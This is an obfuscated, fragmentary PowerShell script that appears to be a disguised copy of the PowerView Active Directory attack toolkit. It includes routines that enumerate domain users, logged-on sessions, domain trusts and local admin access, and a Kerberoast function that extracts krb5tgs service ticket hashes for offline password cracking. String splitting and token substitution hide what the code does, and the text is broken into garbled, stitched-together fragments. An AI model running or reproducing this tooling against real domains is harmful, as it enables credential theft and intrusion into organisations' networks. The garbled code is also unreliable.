            YoV{GIJKpIJKoAcL} JGO &(Z3b{1}{3}{2}{0}Z3b-f S5zrS5z,S5zAdd-MeS5z,S5zeS5z,S5zmbS5z) (Z3b{3}{1}{0}{2}Z3b -f S5zrS5z,S5zeS5z,S5ztyS5z,S5zNotepropS5z) (Z3b{3}{2}','{0}{1}Z3b -fS5zHostNaS5z,S5zmeS5z}, {Z3b{3}{0}{1}{2}Z3b -fS5znsS5z,S5zhostnaS5z,S5zmeS5z,S5zdS5z}, {Z3b{0}{1}Z3b -f S5znS5z,S5zameS5z})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        YoV{COMPuTeIJKRNAIJKmE} = (Z3b{0}{1}Z3b -f S5zlocalhoS5z,S5zstS5z),

        [Management.Automation.PSCredentia','tinS5z,S5zgS5z),(Z3b{4}{2}{5}{1}{0}{3}Z3b-f S5ztS5z,S5ziondaS5z,','5zew-S5z) (Z3b{2}{0}{3}{1}Z3b-f S5zysS5z,S5zomS5z,S5zSS5z,S5ztem.RandS5z)

            ForEach (YoV{tARIJKGIJKeTIJKcoMPuteR} in YoV{tAIJKRgeIJKTcOIJKMputEIJKRS}) {
                YoV{cIJKOuIJKNtEr} = YoV{CIJKOunTeR} + 1

                
                &(Z3b{2}{0}{1}Z3b -fS5zart-SleeS5z,S5zpS5z,S5zStS5z) -Seconds YoV{RaIJKNDno}.(Z3b{0}{1}Z3b-fS5zNeS5z,S5zxtS5z).Invoke((1-YoV{JITIJKTer})*YoV{deIJKlaY}, (1+YoV{JIJKiTIJKTER})*YoV{delIJKAY})

                &(Z3b{1}{2}{0}Z3b -fS5zeS5z,S5zWrite-VS5z,S5zerbosS5z) Z3b[Find-DomainUserEvent] Enumerating server YoVTargetComputer (YoVCounter of YoV(YoVTargetComputers.count)) Z3b
                YoV{REsuIJKlt} = &(Z3b{2}{1}{0}Z3b -f S5zmmandS5z,S5zke-CoS5z,S5zInvoS5z) -ScriptBlock YoV{hosTIJKenuIJKMBLoCK} -ArgumentList YoV{tIJKARIJKgEIJKTcOMIJKPuTeR}, YoV{sIJKTAIJKRIJKTtime}, YoV{eNDtIJKiIJKme}, YoV{mIJKAxEvIJKEnTS}, YoV{tarIJKgIJKETIJKUSErS}, YoV{fIJKIIJKLTER}, YoV{cIJKReDIJKEnTiAl}
                YoV{ReIJKsuLT}

                if (YoV{REsIJKUIJKLT} -and YoV{STOIJKPonSuIJKCIJKCesS}) {
                    &(Z3b{4}{2}{1}{3}{0}Z3b -fS5zoseS5z,S5zVerS5z,S5zrite-S5z,S5zbS5z,S5zWS5z) (Z3b{13}{1}{8}{6}{4}{9}{12}{10}{7}{5}{14}{2}{11}{0}{3}Z3b-f S5zg earlS5z,S5znd-DoS5z,S5ztS5z,S5zyS5z,S5zinUseS5z,S5zfouS5z,S5zaS5z,S5z S5z,S5zmS5z,S5zrEvent] TargeS5z,S5z userS5z,S5zurninS5z,S5ztS5z,S5z[FiS5z,S5znd, reS5z)
                    return
                }
            }
        }
        else {
            &(Z3b{0}{3}{1}{2}Z3b-fS5zWriteS5z,S5zVerbosS5z,S5zeS5z,S5z-S5z) (S5z[FindS5z+S5z-DS5z+S5zomaS5z+S5zinUseS5z+S5zrEvent] S5z+S5zUS5z+S5zsingS5z+S5z S5z+S5zthrS5z+S5zeS5z+S5zadinS5z+S5zg S5z+S5zwiS5z+S5zth S5z+S5zthrS5z+S5zeads:S5z+S5z S5z+Z3bYoVThreadsZ3b)

            
            YoV{SIJKCRiPTIJKpAraIJKMs} = @{
                (Z3b{2}{1}{0}Z3b-f S5zeS5z,S5zrtTimS5z,S5zStaS5z) = YoV{StIJKAIJKRttIME}
                (Z3b{1}{0}Z3b-fS5zTimeS5z,S5zEndS5z) = YoV{eIJKNDIJKTIme}
                (Z3b{0}{2}{1}Z3b-fS5zMaxES5z,S5ztsS5z,S5zvenS5z) = YoV{maIJKXEVIJKeNTS}
                (Z3b{2}{0}{1}Z3b-f S5zetS5z,S5zUsersS5z,S5zTargS5z) = YoV{tarGIJKETIJKUSERs}
                (Z3b{0}{1}{2}Z3b-fS5zFS5z,S5ziS5z,S5zlterS5z) = Y','1}{2}{0}{3}{4}{5}Z3b -fS5ziS5z,S5zDS5z,S5zistS5z,S5zngS5z,S5zuS5z,S5zishedNameS5z}, {Z3b{2}{0}{3}{1}Z3b-fS5zcS5z,S5zuntNameS5z,S5zSamAS5z,S5zcoS5z}, {Z3b{1}{0}Z3b -f S5zmeS5z,S5zNaS5z})]
        [String[]]
        YoV{idenIJKTItY},

        [Switch]
        YoV{sIJKACL},

        [Switch]
        YoV{REsolIJKVEgIJKUIDS},

        [String]
        [Alias({Z3b{1}{0}Z3b -f S5zghtsS5z,S5zRiS5z})]
        [ValidateSet(S5zAllS5z, {Z3b{0}{2}{1}{3}Z3b -fS5zReS5z,S5ztPasswS5z,S5zseS5z,S5zordS5z}, {Z3b{2}{3}{0}{1}Z3b-f S5ziteMembeS5z,S5zrsS5z,S5zWS5z,S5zrS5z})]
        YoV{rIghtsFIJKIIJKLteR},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{DoIJKmAin},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{0}{2}{1}Z3b-f S5zFiS5z,S5zterS5z,S5zlS5z})]
        [String]
        YoV{lDaPIJKFIIJKLter},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{1}{0}{2}Z3b -f S5zPS5z,S5zADSS5z,S5zathS5z})]
        [String]
        YoV{SEAIJKRcIJKhbaIJKSe},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{3}{2}{0}{1}Z3b -f S5zrolS5z,S5zlerS5z,S5zContS5z,S5zDomainS5z})]
        [String]
        YoV{SIJKERvER},

        [ValidateSet({Z3b{0}{1}Z3b -f S5zBS5z,S5zaseS5z}, {Z3b{1}{0}Z3b -fS5zeLevelS5z,S5zOnS5z}, {Z3b{0}{1}{2}Z3b-fS5zSS5z,S5zuS5z','}{2}{1}{0}Z3b-f S5zrS5z,S5zembeS5z,S5zMS5z,S5zAdd-S5z) (Z3b{1}{2}{0}Z3b -f S5zrtyS5z,S5zNotepS5z,S5zropeS5z) (Z3b{1}{2}{0}Z3b-f S5zrSIDS5z,S5zUsS5z,S5zeS5z) YoV{userIJKSIJKID}
                            YoV{fouIJKNDIJKCIJKonneCIJKTiIJKON} JGO &(Z3b{2}{0}{3}{1}Z3b-fS5z-S5z,S5','1}{2}Z3b-fS5zAS5z,S5zdd-MembeS5z,S5zrS5z) (Z3b{1}{0}{2}Z3b -f S5zoteproperS5z,S5zNS5z,S5ztyS5z) (Z3b{1}{3}{0}{2}Z3b -f S5zssionFroS5z,S5zSS5z,S5zmS5z,S5zeS5z) YoV{cIJKNAME}

                                
                                try {
                                    YoV{CnIJKAMeIJKDnSNaME} =  YoV{JIJKq2G}::(Z3b{1}{0}{2}Z3b-f S5ztHostES5z,S5zGeS5z,S5zntryS5z).Invoke(YoV{CNIJKAMe}) JGO &(Z3b{3}{2}{0}{1}Z3b -f S5zt-ObjS5z,S5zectS5z,S5zcS5z,S5zSeleS5z) -ExpandProperty (Z3b{0}{1}Z3b-f S5zHosS5z,S5ztNameS5z)
                                    YoV{USIJKERLIJKOIJKCIJKATiOn} JGO &(Z3b{2}{1}{0}Z3b -fS5zd-MemberS5z,S5zdS5z,S5zAS5z) (Z3b{2}{1}{3}{0}Z3b-f S5zPropertyS5z,S5ztS5z,S5zNoS5z,S5zeS5z) (Z3b{1}{3}{0}{4}{2}Z3b-f S5zonFroS5z,S5zSessS5z,S5zameS5z,S5ziS5z,S5zmNS5z) YoV{cnamEIJKdNsIJKNAmE}
                                }
                                catch {
                                    YoV{uSIJKErIJKlOcaIJKTIJKIOn} JGO &(Z3b{0}{1}{2}Z3b -f S5zAS5z,S5zdd-MembS5z,S5zerS5z) (Z3b{1}{2}{0}Z3b-f S5zpertyS5z,S5zNotePS5z,S5zroS5z) (Z3b{2}{0}{1}{3}{4}Z3b-f S5zroS5z,S5zmS5z,S5zSessionFS5z,S5zNS5z,S5zameS5z) YoV{nUIJKlL}
                                }

                                
                                if (YoV{cHIJKEIJKCIJKKAccEsS}) {
                                    YoV{ADIJKmin} = (&(Z3b{1}{0}{2}{3}Z3b -fS5znS5z,S5zTest-AdmiS5z,S5zAccS5z,S5zessS5z) -ComputerName YoV{CnAIJKme}).Z3bISADmIJKiNZ3b
                                    YoV{userlOIJKCAtIJKiIJKOn} JGO &(Z3b{2}{1}{0}Z3b-fS5zmberS5z,S5zeS5z,S5zAdd-MS5z) (Z3b{0}{2}{1}Z3b-fS5zNS5z,S5zpertyS5z,S5zoteproS5z) (Z3b{1}{0}{2}Z3b -f S5zdS5z,S5zLocalAS5z,S5zminS5z) YoV{aDMIJKiN}.Z3biSAdmIJKInZ3b
                                }
                                else {
                                    YoV{UIJKseRLIJKoCATiOn} JGO &(Z3b{2}{0}{1}Z3b-fS5zMembeS5z,S5zrS5z,S5zAdd-S5z) (Z3b{0}{3}{2}{1}Z3b -fS5zNoteS5z,S5zrtyS5z,S5zopeS5z,S5zprS5z) (Z3b{1}{0}{3}{2}Z3b -fS5zocalAS5z,S5zLS5z,S5zminS5z,S5zdS5z) YoV{NIJKUll}
                                }
                                YoV{USErIJKLocaTIIJKoN}.Z3bpSIJKoBIJKjEctZ3b.Z3btIJKYIJKPEnIJKAmesZ3b.(Z3b{1}{0}{2}Z3b-f S5znseS5z,S5zIS5z,S5zrtS5z).Invoke(0, (Z3b{2}{3}{0}{4}{1}Z3b -f S5zrS5z,S5zocationS5z,S5zPowS5z,S5zeS5z,S5zView.UserLS5z))
                                YoV{USEIJKRIJKlOCIJKATioN}
                            }
                        }
                    }
                    if (-not YoV{StEIJKALIJKTH}) {
                        
                        YoV{loIJKGGeIJKDon} = &(Z3b{1}{0}{2}Z3b -f S5ztLoggedoS5z,S5zGet-NeS5z,S5znS5z) -ComputerName YoV{tArgEtCIJKOIJKmIJKPutEr}
                        ForEach (YoV{USIJKeR} in YoV{lIJKOIJKGGeDon}) {
                            YoV{uIJKseRNAIJKme} = YoV{USIJKeR}.Z3busIJKEIJKRnamEZ3b
                            YoV{USeIJKRdOIJKMain} = YoV{uIJKseR}.Z3blOIJKgIJKoNdOMaInZ3b

                            
                            if ((YoV{UseIJKRNIJKAme}) -and (YoV{UIJKsIJKeRNIJKAME}.(Z3b{0}{1}Z3b-f S5ztriS5z,S5zmS5z).Invoke() -ne S5zS5z)) {
                                if ( (-not YoV{taIJKRIJKgEIJKTUSeRS}) -or (YoV{tIJKARgIJKetUSEIJKRs} -contains YoV{USerNIJKAMe}) -and (YoV{UsIJKErNIJKAme} -notmatch S5z5rjYoVYoVS5z)) {
                                    YoV{IIJKPIJKADDREss} = @(&(Z3b{4}{0}{1}{3}{2}Z3b -fS5zlS5z,S5zve-IPAS5z,S5zessS5z,S5zddrS5z,S5zResoS5z) -ComputerName YoV{TAIJKRGIJKEtcOMpUtIJKeR})[0].Z3bIPaDIJKDrIJKeSSZ3b
                                    YoV{USIJK',',S5zNotepS5z,S5zyS','+S5zE))nOE S5z)-CRePlaCE  ([ch','rNamS5z+S5zeS5z+S5z{0}]={0}S5z+S5zAS5z+S5zNONYS5z+S5zMOUS5z+S5zS S5z)  -F[chAr]39+(S5zLOGOS5z+S5zN{0}S5z+S5z
S5z+S5z S5z) -F [Char]39+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5zoS5z+S5zr
 S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S','IIJKON})
            if (YoV{sCrIJKIIJKptpaRaMEtEIJKRS}) {
                ForEach (YoV{PARIJKAM} in YoV{sCriptIJKPaIJKRaMEIJKTeIJKRS}.(Z3b{1}{3}{0}{2}{4}Z3b-f S5zratS5z,S5zGetEnS5z,S5zoS5z,S5zumeS5z,S5zrS5z).Invoke()) {
                    YoV{NuIJKLl} = YoV{POIJKwERIJKshIJKelL}.(Z3b{0}{1}{2}{3}Z3b -fS5zAS5z,S5zddPaS5z,S5zrS5z,S5zameterS5z).Invoke(YoV{PArIJKAM}.Z3bnaIJKMeZ3b, YoV{pIJKAIJKRam}.Z3bVAIJKLUeZ3b)
                }
            }

            
            YoV{outIJKPuT} = &(Z3b{2}{0}{1}Z3b -f S5zbjS5z,S5zectS5z,S5zNew-OS5z) (Z3b{1}{0}{3}{9}{5}{10}{4}{7}{8}{11}{6}{2}Z3b -f S5znS5z,S5zMaS5z,S5zct]S5z,S5zagement.Automa','Z3b-f S5zssS5z,S5zuldPS5z,S5zroceS5z,S5zPSShoS5z}, S5zS5z)]
    [OutputType({Z3b{1}{2}{3}{0}Z3b -f S5zLS5z,S5zPoweS5z,S5zrS5z,S5zView.Group','{1}{0}Z3b -f S5zjectS5z,S5zew-ObS5z,S5zNS5z) (Z3b{8}{9}{6}{3}{0}{5}{10}{7}{4}{11}{1}{2}Z3b-f S5zrity.Principal.SS5z,S5zifiS5z,S5zerS5z,S5zSecuS5z,S5zdenS5z,S5zeS5z,S5zem.S5z,S5zurityIS5z,S5zSyS5z,S5zstS5z,S5zcS5z,S5ztS5z)(YoV{prOIJKPs}.Z3bSECurIJKitIJKyidIJKeNTIFIerZ3b[0],0)).Z3bvIJKAluEZ3b

                    YoV{dOMAIIJKNtrIJKUIJKSt} JGO &(Z3b{1}{0}{2}Z3b-fS5zdd-MembeS5z,S5zAS5z,S5zrS5z) (Z3b{0}{3}{2}{1}Z3b-f S5zNoteS5z,S5ztyS5z,S5zrS5z,S5zpropeS5z) (Z3b{1}{2}{0}Z3b-fS5zmeS5z,S5zSourS5z,S5zceNaS5z) YoV{sOuRIJKCIJKedIJKoMaIJKin}
                    YoV{DIJKOIJKMainTrUIJKst} JGO &(Z3b{2}{3}{1}{0}Z3b -fS5zberS5z,S5zemS5z,S5zAdS5z,S5zd-MS5z) (Z3b{0}{2}{1}Z3b-fS5zNotS5z,S5zropertyS5z,S5zepS5z) (Z3b{0}{3}{2}{1}Z3b -fS5zTS5z,S5zameS5z,S5zNS5z,S5zargetS5z) YoV{PrIJKoIJKps}.Z3bNAIJKMeZ3b[0]
                    
                    YoV{DIJKOIJKMAIntRIJKUst} JGO &(Z3b{0}{2}{1}Z3b-fS5zAdd-S5z,S5zemberS5z,S5zMS5z) (Z3b{1}{0}{2}{3}Z3b -fS5zoteS5z,S5zNS5z,S5zproS5z,S5zpertyS5z) (Z3b{0}{1}Z3b -fS5zTrusS5z,S5ztTypeS5z) YoV{TRuIJKSTTIJKypE}
                    YoV{DIJKOmIJKAINIJKTrUSt} JGO &(Z3b{1}{0}{3}{2}Z3b-fS5zdd-MeS5z,S5zAS5z,S5zrS5z,S5zmbeS5z) (Z3b{2}{3}{0}{1}Z3b-fS5zrS5z,S5ztyS5z,S5zNS5z,S5zotepropeS5z) (Z3b{0}{2}{3}{1}Z3b-f S5zTrustAS5z,S5zsS5z,S5zttributS5z,S5zeS5z) YoV(YoV{TrUIJKSTIJKAtTrIB} -join S5z,S5z)
                    YoV{DoMIJKAiNtIJKRUst} JGO &(Z3b{2}{0}{1}Z3b -f S5zdd-MeS5z,S5zmberS5z,S5zAS5z) (Z3b{1}{2}{3}{0}Z3b -fS5zertyS5z,S5zNoS5z,S5ztS5z,S5zepropS5z) (Z3b{4}{2}{0}{3}{1}Z3b-fS5ztS5z,S5zonS5z,S5ztDirecS5z,S5ziS5z,S5zTrusS5z) Z3bYoVDirectionZ3b
                    YoV{dIJKoMaiNIJKTIJKRUst} JGO &(Z3b{0}{2}{3}{1}Z3b-fS5zAdd-MS5z,S5zberS5z,S5zeS5z,S5zmS5z) (Z3b{1}{0}{2}{3}Z3b-fS5ztS5z,S5zNoS5z,S5zeproS5z,S5zpertyS5z) (Z3b{1','oV{iNcReIJKMIJKENt}
  ','in} = (&(Z3b{2}{0}{1}Z3b-f S5zet-DomaS5z,S5zinS5z,S5zGS5z)).Z3bnIJKAMEZ3b
    }
    YoV{DIJKOmIJKAInS}.(Z3b{1}{0}Z3b -f S5zhS5z,S5zPusS5z).Invoke(YoV{cuIJKRrIJKEIJKNIJKTdoMAIn})

    while(YoV{dOIJKmAiIJKNS}.Z3bCIJKouNTZ3b -ne 0) {

        YoV{DoIJKmaIJKin} = YoV{DoMIJKAIJKiNs}.(Z3b{1}{0}Z3b -fS5zpS5z,S5zPoS5z).Invoke()

        
        if (YoV{dOMIJKAIJKin} -and (YoV{dOMIJKAIn}.(Z3b{0}{1}Z3b -f S5zTriS5z,S5zmS5z).Invoke() -ne S5zS5z) -and (-not YoV{SIJKeEIJKNdOmaIJKiNs}.(Z3b{1}{0}{3}{2}Z3b-fS5ztaiS5z,S5zConS5z,S5zeyS5z,S5znsKS5z).Invoke(YoV{DIJKOmaIJKiN}))) {

            &(Z3b{2}{3}{1}{0}Z3b -fS5zeS5z,S5zrbosS5z,S5zWriS5z,S5zte-VeS5z) (S5z[S5z+S5zGeS5z+S5zt-DomainTS5z+S5zrustMappS5z+S5zinS5z+S5zgS5z+S5z]S5z+S5z S5z+S5zES5z+S5znumeratingS5z+S5z S5z+S5ztS5z+S5zrusts S5z+S5zforS5z+S5z S5z+S5zdoS5z+S5zmS5z+S5zain: S5z+Z3bS5zYoVDomainS5zZ3b)

            
            YoV{NIJKUll} = YoV{sEeNdIJKoIJKMaiIJKNs}.(Z3b{1}{0}Z3b -fS5zdS5z,S5zAdS5z).Invoke(YoV{DIJKoMIJKAIN}, S5zS5z)

            try {
                
                YoV{DOMAiIJKNtruSTIJKAIJKRIJKGumIJKENts}[(Z3b{0}{1}Z3b-fS5zDoS5z,S5zmainS5z)] = YoV{domIJKAIn}
                YoV{TrIJKUsts} = &(Z3b{3}{1}{0}{2}Z3b-fS5zainTS5z,S5zDomS5z,S5zrustS5z,S5zGet-S5z) @DomainTrustArguments

                if (YoV{TIJKRUsTs} -isnot [System.Array]) {
                    YoV{TrIJKUSIJKTs} = @(YoV{TRIJKUstS})
                }

                
                if (YoV{pScIJKMIJKdleT}.pARAMEteRseTnAME -eq S5zNETS5z) {
                    YoV{FoRIJKesIJKTtruSIJKTArIJKGUMENTS} = @{}
                    if (YoV{pSIJKBIJKOIJKUNdpIJKAraMEIJKTers}[(Z3b{0}{1}Z3b -fS5zForeS5z,S5zstS5z)]) { YoV{fIJKOIJKReSTtRuIJKsTAIJKRgUIJKmEnTS}[(Z3b{1}{0}{2}Z3b -fS5zoreS5z,S5zFS5z,S5zstS5z)] = YoV{FIJKOIJKResT} }
                    if (YoV{PsIJKBIJKOUIJKNDpaRIJKAMeTIJKeRS}[(Z3b{2}{0}{1}Z3b-f S5zaS5z,S5zlS5z,S5zCredentiS5z)]) { YoV{FoREStTrUIJKsTArIJKguMIJKEIJKNts}[(Z3b{0}{1}{3}{2}Z3b-f S5zCS5z,S5zredeS5z,S5ztialS5z,S5znS5z)] = YoV{cIJKReDeNIJKTiIJKAl} }
                    YoV{trIJKUsTS} += &(Z3b{3}{1}{0}{2}Z3b-f S5zsS5z,S5zrestTruS5z,S5ztS5z,S5zGet-FoS5z) @ForestTrustArguments
                }

                if (YoV{tIJKRIJKUSTS}) {
             ',' }
        if (YoV{PSbIJKOuIJKNIJKDPARAmeTerS}[(Z3b{0}{3}{2}{4','f (YoV{psbIJKoUnIJKdparaIJKMeTeIJKRS}[(Z3b{1}{0}Z3b-fS5zrS5z,S5zUseS5z)]) {
            YoV{tARIJKGEIJKTObIJKjIJKECT} = YoV{UIJKSER}
        }
        else {
            YoV{TarGIJKETOBIJKject} = YoV{SIJKPn}
        }

        ForEach (YoV{oBIJKJECt} in YoV{tIJKARgETIJKObjeCt}) {
            if (YoV{PsboUIJKNDPIJKArAMeIJKTERs}[(Z3b{1}{0}Z3b -fS5zrS5z,S5zUseS5z)]) {
                YoV{USeIJKRIJKspN} = YoV{oIJKBIJKject}.Z3bsErVIIJKcEPRIJKiIJKNIJKCIJKIPaLnaMEZ3b
                YoV{SAMaCCIJKOunIJKTIJKNaMe} = YoV{obJeIJKCT}.Z3bSaIJKmaCcIJKOUNtIJKNIJKAMEZ3b
                YoV{dIIJKsTiIJKNgIJKUiSheDname} = YoV{ObjIJKect}.Z3bDIJKIsIJKTIngUiShIJKeDnIJKAMEZ3b
            }
            else {
                YoV{UIJKsEIJKRspN} = YoV{ObJeIJKCT}
                YoV{SAIJKMACCOunIJKTIJKNaME} = (Z3b{0}{2}{1}Z3b-fS5zUNKNOS5z,S5zNS5z,S5zWS5z)
                YoV{DIstInIJKgIJKUIJKIIJKsHedNIJKAmE} = (Z3b{2}{1}{0}Z3b-fS5zWNS5z,S5zNOS5z,S5zUNKS5z)
            }

            
            if (YoV{USEIJKRIJKspn} -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                YoV{uSIJKERIJKSpn} = YoV{UIJKSEIJKRsPn}[0]
            }

            try {
                YoV{tICkIJKEt} = &(Z3b{1}{3}{0}{2}Z3','S5z,S5zrS5z})]
    [CmdletBinding(dEfAUltParAmetErsEtNAME = {Z3b{1}{2}{0}{3}Z3b-fS5zicatiS5z,S5zFileS5z,S5zSpecifS5z,S5zonS5z})]
    Param(
        [Parameter(POSiTIon = 0, VAlUEFRomPipeliNE = YoV{TRIJKUe}, vAluefrOMpiPElINeBYpRopeRTYnaME = YoV{trIJKUe})]
        [Alias({Z3b{0}{1}{2}{3}Z3b -fS5zDS5z,S5zNSHostNaS5z,S5zmS5z,S5zeS5z})]
        [String[]]
        YoV{coIJKMPUtIJKErNAME},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{cIJKomPIJKUIJKTErDomIJKAIN},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{CoMpUIJKTErIJKLdaPfiIJKLIJKTer','YoV{grOupfIJKouIJKNIJKddN}) {
                            YoV{GRIJKoIJKUIJKPfIJKoUNdDomAiN} = YoV{GIJKRoIJKUPFOUNDdN}.(Z3b{0}{2}{1}Z3b -fS5zSubSS5z,S5zngS5z,S5ztriS5z).Invoke(YoV{GIJKRIJKOupfOIJKUNDIJKdN}.(Z3b{0}{1}{2}Z3b-f S5zInS5z,S5zdeS5z,S5zxOfS5z).Invoke(S5zDC=S5z)) -replace S5zDC=S5z,S5zS5z -replace S5z,S5z,S5z.S5z
                        }
                    }
                    &(Z3b{3}{0}{1}{4}{2}Z3b -f S5ziteS5z,S5z-S5z,S5zeS5z,S5zWrS5z,S5zVerbosS5z) (S5z[GetS5z+S5z-DomaiS5z+S5znS5z+S5zGroupMemberS5z+S5z] S5z+S5zUsingS5z+S5z S5z+S5zLDAS5z+S5zP S5z+S5zmatS5z+S5zchiS5z+S5zng S5z+S5zrulS5z+S5ze S5z+S5ztS5z+S5zo S5z+S5zrecS5z+S5zurseS5z+S5z S5z+S5zonS5z+S5z S5z+Z3bS5zYoVGroupFoundDNS5z, Z3b+S5zonlyS5z+S5z S5z+S5zuseS5z+S5zr S5z+S5zaccS5z+S5zountsS5z+S5z S5z+S5zwiS5z+S5zll S5z+S5zbeS5z+S5z S5z+S5zrS5z+S5zeS5z+S5zturned.S5z)
                    YoV{GroIJKUPIJKSEArcIJKHEr}.Z3bfilIJKTeRZ3b = Z3b(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=YoVGroupFoundDN))Z3b
                    YoV{gROUPsIJKeIJKArcHer}.Z3bpIJKROIJKpERtIJKiESIJKTOLoadZ3b.(Z3b{2}{1}{0}Z3b-fS5zangeS5z,S5zddRS5z,S5zAS5z).Invoke(((Z3b{2}{5}{0}{3}{1}{4}Z3b-f S5zngS5z,S5zishedNaS5z,S5zdisS5z,S5zuS5z,S5zmeS5z,S5ztiS5z)))
                    YoV{mIJKEmIJKBers} = YoV{gROuIJKPSIJKeIJKArIJKCHER}.(Z3b{1}{0}Z3b -f S5zlS5z,S5zFindAlS5z).Invoke() JGO &(Z3b{0}{3}{1}{2}Z3b -fS5zFS5z,S5zach-ObjS5z,S5zectS5z,S5zorES5z) {YoV{_}.Z3bPRIJKoPERtIIJKesZ3b.Z3bdIStiNGuIJKiIJKSHeIJKdIJKNIJKAmEZ3b[0]}
                }
                YoV{NuIJKLl} = YoV{SIJKEARCIJKHEraRgIJKUMeNts}.(Z3b{1}{0}Z3b -f S5zoveS5z,S5zRemS5z).Invoke(S5zRawS5z)
            }
            else {
                YoV{iIJKdENtIIJKTYFILTER} = S5zS5z
                YoV{fIJKILIJKTer} = S5zS5z
                YoV{idIJKEIJKNtiTY} JGO &(Z3b{0}{1}{3}{2}Z3b -f S5zWS5z,S5zherS5z,S5zectS5z,S5ze-ObjS5z) {YoV{_}} JGO &(Z3b{3}{2}{0}{1}Z3b -f S5zch-ObjeS5z,S5zctS5z,S5zrEaS5z,S5zFoS5z) {
                    YoV{IDEnIJKTIJKitYINStaIJKNIJKCe} = YoV{_}.(Z3b{1}{0}{2}Z3b -fS5zeS5z,S5zRS5z,S5zplaceS5z).Invoke(S5z(S5z, S5z5rj28S5z).(Z3b{2}{1}{0}Z3b-fS5zceS5z,S5zplaS5z,S5zReS5z).Invoke(S5z)S5z, S5z5rj29S5z)
                    if (YoV{IdEIJKNtIJKIIJKTYiNStAIJKNCe} -match (Z3b{1}{0}Z3b-f S5z-S5z,S5z^S-1S5z)) {
                        YoV{iDeIJKNIJKTITyFIlteR} += Z3b(objectsid=YoVIdentityInstance)Z3b
                    }
                    elseif (YoV{IDEnTityInSIJKTIJKAIJKNCe} -match (Z3b{1}{0}Z3b -f S5zN=S5z,S5z^CS5z)) {
                        YoV{IDeIJKNIJKTITIJKyFILIJKTeR} += Z3b(distinguishedname=YoVIdentityInstance)Z3b
                        if ((-not YoV{PsBoIJKUIJKNdpArIJKAmIJKeterS}[(Z3b{1}{0}Z3b-fS5zinS5z,S5zDomaS5z)]) -and (-not YoV{pSBIJKOuIJKNdpAIJKRamI','YoVkrb5tgsIJKYoVYoV(YoVTicket.ServicePrincipalName):YoVHashZ3b
                    }
                    else {
                        if (YoV{dISIJKTiNgUIIJKSHednIJKAIJKmE} -ne (Z3b{0}{1}Z3b-fS5zUNKNS5z,S5zOWNS5z)) {
                            YoV{UsIJKERIJKdoMaIn} = YoV{dISTiIJKNgIJKUIJKisheIJKdnamE}.(Z3b{2}{1}{0}Z3b-fS5zStringS5z,S5zubS5z,S5zSS5z).Invoke(YoV{diIJKstIJKiIJKNguiIJKsHEdNAMe}.(Z3b{1}{2}{0}Z3b-fS5zxOfS5z,S5zIndS5z,S5zeS5z).Invoke(S5zDC=S5z)) -replace S5zDC=S5z,S5zS5z -replace S5z,S5z,S5z.S5z
                        }
                        else {
                            YoV{UIJKseRDOIJKmAIn} = (Z3b{2}{0}{1}Z3b-f S5zNS5z,S5zKNOWNS5z,S5zUS5z)
                        }

                        
                        YoV{HasIJKhIJKFoIJKRMaT} = Z3bIJKYoVkrb5tgsIJKYoVYoV(YoVEtype)IJKYoV*YoVSamAccountNameIJKYoVYoVUserDomainIJKYoVYoV(YoVTicket.ServicePrincipalName)*IJKYoVYoVHashZ3b
                    }
                    YoV{oIJKUt} JGO &(Z3b{1}{0}{2}Z3b -f S5zd-MS5z,S5zAdS5z,S5zemberS5z) (Z3b{0}{1}{2}Z3b -fS5zNS5z,S5zotS5z,S5zepropertyS5z) (Z3b{0}{1}Z3b -fS5zHasS5z,S5zhS5z) YoV{HasIJKhFOIJKRmAt}
                }

                YoV{OIJKUt}.Z3bPSoIJKBjIJKEcTZ3b.Z3btyIJKPIJKENAMEsZ3b.(Z3b{0}{1}Z3b -fS5zInseS5z,S5zrtS5z).Invoke(0, (Z3b{4}{1}{0}{5}{3}{2}Z3b-f S5zw.SS5z,S5zVieS5z,S5zcketS5z,S5ziS5z,S5zPowerS5z,S5zPNTS5z))
                YoV{oIJKUT}
            }
        }
    }

    END {
        if (YoV{lIJKoIJKgONIJKTOkEn}) {
            &(Z3b{2}{3}{0}{1}Z3b -fS5zertToSelS5z,S5zfS5z,S5zIS5z,S5znvoke-RevS5z) -TokenHandle YoV{LOgoNIJKToIJKkEN}
        }
    }
}


function InVokIJKe-IJKkErBeRIJKOaIJKST {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{0}{1}{2}Z3b -f S5zPSSS5z,S5zhouldPS5z,S5zrocessS5z}, S5zS5z)]
    [OutputType({Z3b{4}{6}{0}{1}{5}{2}{3}Z3b -fS5z.S5z,S5zSPNTS5z,S5zcS5z,S5zketS5z,S5zPowerS5z,S5ziS5z,S5zViewS5z})]
    [CmdletBinding()]
    Param(
        [Parameter(pOsiTIOn = 0, VALUefROmpipEliNE = YoV{TIJKRUE}, ValUEfRompiPELineBYpROpeRTYnAMe = YoV{TIJKRUe})]
        [Alias({Z3b{0}{1}{3}{2}{4}Z3b -f S5zDiS5z,S5zstingS5z,S5zNamS5z,S5zuishedS5z,S5zeS5z}, {Z3b{2}{0}{1}{3}{4}Z3b -fS5zmAccS5z,S5zountNaS5z,S5zSaS5z,S5zmS5z,S5zeS5z}, {Z3b{1}{0}Z3b -fS5zmeS5z,S5zNaS5z}, {Z3b{4}{6}{0}{2}{5}{3}{1}Z3b -f S5zisS5z,S5zameS5z,S5ztS5z,S5znguishedNS5z,S5zMeS5z,S5ziS5z,S5zmberDS5z}, {Z3b{2}{0}{1}Z3b-f S5zamS5z,S5zeS5z,S5zMemberNS5z})]
        [String[]]
        YoV{ideNTIJKiTy},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{dIJKOMAIJKIN},

        [ValidateNotNullOrEmpty()]
